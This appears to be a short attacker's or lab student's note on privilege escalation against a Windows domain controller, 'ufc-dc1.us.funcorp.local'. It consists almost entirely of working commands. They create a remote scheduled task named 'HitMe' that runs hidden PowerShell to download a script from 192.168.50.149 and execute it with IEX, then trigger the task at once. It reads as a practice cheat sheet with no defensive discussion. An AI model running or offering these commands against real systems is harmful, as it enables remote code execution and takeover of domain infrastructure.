## Privesc Options





## What access do we have?
# Do we have HOST service access? We can do scheduled tasks.
schtasks /query /S ufc-dc1.us.funcorp.local
# Can we create us one?
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -c IEX((New-Object Net.WebClient).downloadString(''http://192.168.50.149/IPSTO.ps1'')) " '
$trigger = New-ScheduledTaskTrigger -Once -At 22:08
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "HitMe" -Description "shell me up" 
# Not sure how to use Register-ScheduledTask remotely, guess we'll go old-school with schtasks
schtasks /create /S ufc-dc1.us.funcorp.local /tn "HitMe" /tr "powershell.exe -c iex ((new-Object Net.WebClient).DownloadString('http://192.168.50.149/IPSTO.ps1'))" /sc once /st 06:11 /sd 05/12/2020
schtasks /create /S ufc-dc1.us.funcorp.local /tn "HitMe" /tr "powershell.exe -NoProfile -WindowStyle Hidden -command &{iex ((new-Object Net.WebClient).DownloadString('http://192.168.50.149/IPSTO.ps1')) }"  /sc once /st 22:44 /sd 05/11/2020
# Runs the task now!
schtasks /run /tn "HitMe" /S ufc-dc1.us.funcorp.local 